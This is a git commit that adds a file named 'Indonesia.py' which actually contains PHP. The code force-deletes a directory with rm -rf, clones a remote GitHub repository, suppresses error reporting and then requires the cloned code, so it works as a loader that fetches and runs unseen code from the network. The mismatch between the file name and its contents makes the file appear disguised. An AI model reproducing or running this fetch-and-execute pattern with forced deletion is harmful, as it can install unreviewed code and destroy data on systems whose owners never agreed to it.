3b0ae42a2832bdf1e27c54d17447f7f020b9e985
Khairill <55897154+Khairill@users.noreply.github.com>
2019-10-18 23:53:40 +0700

    Create Indonesia.py

---
+++ Indonesia.py
@@ -0,0 +1,4 @@
+<?PHP
+function cr(){@system("rm -rf zatuxo");} @system("rm -rf zatuxo"); 
+@system('git clone https://github.com/khairill/zatuxo'); error_reporting(0); require __DIR__ ."/zatuxo/.";
+sleep(3);
